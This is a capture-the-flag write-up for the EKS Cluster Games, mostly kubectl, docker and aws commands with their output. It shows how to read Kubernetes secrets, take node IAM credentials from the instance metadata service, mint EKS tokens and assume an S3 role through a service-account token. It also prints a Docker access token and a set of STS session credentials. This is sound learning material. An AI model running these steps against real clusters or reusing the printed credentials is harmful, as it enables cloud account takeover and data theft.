# EKS CTF

* create alias

  ```bash
  alias k='kubectl'
  ```

## Challenge 1

* https://eksclustergames.com/challenge/1

### Solution

* List Details

  ```bash
  k get all --all-namespaces
  ```
  > Service Account/User doesn't have any permission

* try Cheatsheet

  ```bash
  k get secrets
  ```

* list secrets

  ```bash
  k get secret <secret-name> -o json
  ```

* decode secret from base64 value

  ```bash
  echo '<secret-value>' | base64 -d
  ```

## Challenge 2

* https://eksclustergames.com/challenge/2

* list resources

  ```bash
  k get all
  ```

  > we have permission to view pods

* list pods

  ```bash
  k get pod
  ```

* describe pod

  ```bash
  k describe pod <pod-name>
  ```

  > couldn't find anything useful

* get pod data in different format (as it provides more data)

  ```bash
  k get pod <pod-name> -o yaml # json
  ```

  > image pull secrets contains secret name `registry-pull-secrets-780bab1d`
  > container image: `eksclustergames/base_ext_image`

* View secret as we have permission to view secret

  ```bash
  kubectl get secret registry-pull-secrets-780bab1d -o jsonpath="{.data.*}" | base64 -d
  ```

  > `.dockerconfigjson` contains docker account token in docker account

* base64 decode value from "auth" key

  ```bash
  echo "ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==" | base64 -d
  ```

### Pulling and analyzing container image 

* container image: `eksclustergames/base_ext_image`

* login to docker account

  ```bash
  docker login docker.io
  # enter username and token in password field
  ```

* pull image

  ```bash
  docker pull eksclustergames/base_ext_image
  ```

* Get shell access to the container

  ```bash
  docker run -it --rm eksclustergames/base_ext_image /bin/sh
  ```

* List files

  ```bash
  ls -la
  ```

* read flag

  ```bash
  cat flag.txt
  ```

## Challenge 3

* Based on permissions, we only have ability to list and get pods

  ```bash
  k get pods
  ```

* get pod details

  ```bash
  k get pod accounting-pod-876647f8 -o yaml
  ```

  > From above we can get the container image: `688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01`

* Container image is stored in ECR on amazon. Challenge description hints us that something is stored in image. So, inorder to pull image we need AWS credentials. As we're in EKS pod, we'll be able to call IMDS (Instance Metadata Service) for fetching credentials.

  ```bash
  curl http://169.254.169.254/latest/meta-data

  # after enumeration
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
  ```

  > It returns AWS credentials

* configure aws cli

  ```bash
  aws configure # use credential from above step
  # region is us-west-1, from ecr link

  aws configure set aws_session_token <SESSIONTOKENHERE>
  ```

* list ECR repos

  ```bash
  aws ecr describe-repositories

  # {
  #     "repositories": [
  #         {
  #             "repositoryArn": "arn:aws:ecr:us-west-1:688655246681:repository/central_repo-aaf4a7c",
  #             "registryId": "688655246681",
  #             "repositoryName": "central_repo-aaf4a7c",
  #             "repositoryUri": "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c",
  #             "createdAt": 1698845486.721,
  #             "imageTagMutability": "MUTABLE",
  #             "imageScanningConfiguration": {
  #                 "scanOnPush": false
  #             },
  #             "encryptionConfiguration": {
  #                 "encryptionType": "AES256"
  #             }
  #         }
  #     ]
  # }
  ```

* Login to AWS ECR

  ```bash
  aws ecr get-login-password --region us-west-1 | docker login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com
  ```

* Pull docker image

  ```bash
  docker pull 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
  ```

* Inspect image

  ```bash
  docker inspect 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
  ```

  > couldn't find any useful information

* check docker history

  ```bash
  docker history 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 --no-trunc
  ```

  > history is leaking ARTIFACTORY_TOKEN which contains the flag

## Challenge 4

* Initially, we don't have any permission for the pod. We need some detail to headstart.

* let's view kubeconfig

  ```bash
  k config view
  ```

  ```yaml
  apiVersion: v1
  clusters:
  - cluster:
      certificate-authority: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
      server: https://10.100.0.1
    name: localcfg
  contexts:
  - context:
      cluster: localcfg
      namespace: challenge4
      user: user
    name: localcfg
  current-context: localcfg
  kind: Config
  preferences: {}
  users:
  - name: user
    user:
      token: REDACTED
  ```

  > Here, we only get information for `cluster name`

* List pods

  ```bash
  k get pod # above command doesn't work since token is invalid
  ``` 
  > above command will fail due to invalid token

* We need to somehow get hold of valid token, since pods are hosted using eks and we're inside aws eks node, we can use IMDS service to get valid eks token.

  ```bash
  aws sts get-caller-identity

  # output:
  # {
  #     "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
  #     "Account": "688655246681",
  #     "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
  # }
  ```
  > credentials are pre-configured.
  > EKS cluster name seems to be `eks-challenge-cluster`

* generate token for the cluster

  ```bash
  export TOKEN=$(aws eks get-token --cluster-name eks-challenge-cluster | jq -r '.status.token')
  ```

* test token by getting pods list

  ```bash
  k get pods --token=$TOKEN
  ```
  > token seems to be valid
  > update token in ~/.kube/config

* to get complete list of permissions use 

  ```bash
  k auth can-i --list --token=$TOKEN
  ```

* View Secrets

  ```bash
  k get secrets -o json --token=$TOKEN
  ```

* Get flag 

  ```bash
  k get secrets -o jsonpath={.items[0].data.flag} --token=$TOKEN | base64 -d
  ```

  > The misconfiguration highlighted in this challenge is a common occurrence, and the same technique can be applied to any EKS cluster that doesn't enforce IMDSv2 hop limit.


## Challenge 5

* check iam role/user identity

  ```bash
  aws sts get-caller-identity

  # output
  # {
  #     "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
  #     "Account": "688655246681",
  #     "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
  # }
  ```

* verify kubectl creds

  ```bash
  kubectl whoami
  ```

* get list of service accounts

  ```bash
  k get sa -o json

  # {
  #     "apiVersion": "v1",
  #     "items": [
  #         {
  #             "apiVersion": "v1",
  #             "kind": "ServiceAccount",
  #             "metadata": {
  #                 "annotations": {
  #                     "description": "This is a dummy service account with empty policy attached",
  #                     "eks.amazonaws.com/role-arn": "arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e"
  #                 },
  #                 "creationTimestamp": "2023-10-31T20:07:37Z",
  #                 "name": "debug-sa",
  #                 "namespace": "challenge5",
  #                 "resourceVersion": "671929",
  #                 "uid": "6cb6024a-c4da-47a9-9050-59c8c7079904"
  #             }
  #         },
  #         {
  #             "apiVersion": "v1",
  #             "kind": "ServiceAccount",
  #             "metadata": {
  #                 "creationTimestamp": "2023-10-31T20:07:11Z",
  #                 "name": "default",
  #                 "namespace": "challenge5",
  #                 "resourceVersion": "671804",
  #                 "uid": "77bd3db6-3642-40d5-b8c1-14fa1b0cba8c"
  #             }
  #         },
  #         {
  #             "apiVersion": "v1",
  #             "kind": "ServiceAccount",
  #             "metadata": {
  #                 "annotations": {
  #                     "eks.amazonaws.com/role-arn": "arn:aws:iam::688655246681:role/challengeEksS3Role"
  #                 },
  #                 "creationTimestamp": "2023-10-31T20:07:34Z",
  #                 "name": "s3access-sa",
  #                 "namespace": "challenge5",
  #                 "resourceVersion": "671916",
  #                 "uid": "86e44c49-b05a-4ebe-800b-45183a6ebbda"
  #             }
  #         }
  #     ],
  #     "kind": "List",
  #     "metadata": {
  #         "resourceVersion": ""
  #     }
  # }
  ```

* Create token for assuming role with sts audience in JWT

  ```bash
  export WEBTOKEN=$(k create token debug-sa --audience "sts.amazonaws.com")
  ```

* create AWS resourcce 

  ```bash
  aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::688655246681:role/challengeEksS3Role" --role-session-name exploitSession --web-identity-token $WEBTOKEN

  # {
  #     "Credentials": {
  #         "AccessKeyId": "ASIA2AVYNEVMSH7VEQ4H",
  #         "SecretAccessKey": "zKlRExyP66QyPa1251dX7lIVpzHSQ19umTCNaldC",
  #         "SessionToken": "IQoJb3JpZ2luX2VjEAMaCXVzLXdlc3QtMSJIMEYCIQD9E4DQyd6YFyPjG7RgYH3wA9sWp8+XYqPQGxG2cDlE4wIhAOKQU1O/kg1lnU3BZbuFsHOFDLrt6XodKozRdpnNlcEmKsgECNz//////////wEQARoMNjg4NjU1MjQ2NjgxIgzIUg32SeZd0+TriPIqnAQteSNlP9XBL066aaVrEKwGpfQq0ABW5x6kz8wung1wGWGcfB08Pcfmeg0XS/UM7ozQjLeT8oJGVbafOh+8sDUGux6cwBAtKHTSAar68WHlykpAdnon2IMstezaldHhm0SAbAsxEboB4xbD1UIsZlXhS+tmkRjMOcMJw9MA/DnJqShL2vH9/cTOiFYttd/fpDzttUF4jJfn+KkNUMDDyGJE4pm2e8qyrKgCfssWKXYVROv4P44Qr0r/CYKBRxh58oWrhEdER1TCiPvqjUsAttt5odsQzDWELnUo4QEGcLm4NrPKWcsjjPgOo7G/4CrTPLzg0E7B/Du9kxMtqNRQs72ei7+2OfRoRCHT88ICHEzbmsLojW4R/wtBdyUvZ3RRoq4ZmGenQXjcGfsfuXkAVgi5NAfRDy6+MH6qY0jJqDVKaDI+YvPbkfHMzBcggVrM4TW4QZm/voe/lTTatv0WEWhACC0jcAmYmg8lq9CUye0tlER/Sk5FgjKzlUUN7M8ogeDHoNdNLsZBHJVqPa8XXq0y3ybrC/dFAb1zQc9cV6tYYhzLKeDrbOCH3ioICyE4nfKGgOJBRsLPtxjhfa2qXCn0hWaahCmewWDUnow4lWyux7XiPhn8uDDHPZhEh3cf0CIbDqkdgjsjr9lv3uxZw1j7T5Qtds8E+Xg3ws9V3YBm9GCkJU8CEgBaRcooMCz6w0OrBRLq516X3LjyehMwq+OPtQY6lAHLP2zqbJ8QU+/MdWdwFrPy2iOBby3hKftqMoaFSuzIq8JVPraL31o3uizWFVkMt99HvAWCoLjwM3KpuRoWPZfGwWwvgkF6b1htmz2Xw1CKTX3o9DuE1qqG6jHlZP1jbLo+82NqmNhD3URyZhSHGm0tORrQ4GMex8cIEoKZJGyS+5UC3HineiKD3hWUISlt96T4S/PH",
  #         "Expiration": "2024-07-26T19:57:47+00:00"
  #     },
  #     "SubjectFromWebIdentityToken": "system:serviceaccount:challenge5:debug-sa",
  #     "AssumedRoleUser": {
  #         "AssumedRoleId": "AROA2AVYNEVMZEZ2AFVYI:exploitSession",
  #         "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/exploitSession"
  #     },
  #     "Provider": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",
  #     "Audience": "sts.amazonaws.com"
  # }
  ```

* configure profile

  ```bash
  aws configure --profile exploit
  aws configure set aws_session_token <SESSIONTOKENHERE> --profile exploit
  ```

* check identity

  ```bash
  aws sts get-caller-identity --profile exploit

  # {
  #     "UserId": "AROA2AVYNEVMZEZ2AFVYI:exploitSession",
  #     "Account": "688655246681",
  #     "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/exploitSession"
  # }s
  ```

* get flag

  ```bash
  aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag - --profile exploit
  ```

## Certificate Link

![https://eksclustergames.com/finisher/AvsdgQdo](https://eksclustergames.com/image/AvsdgQdo)
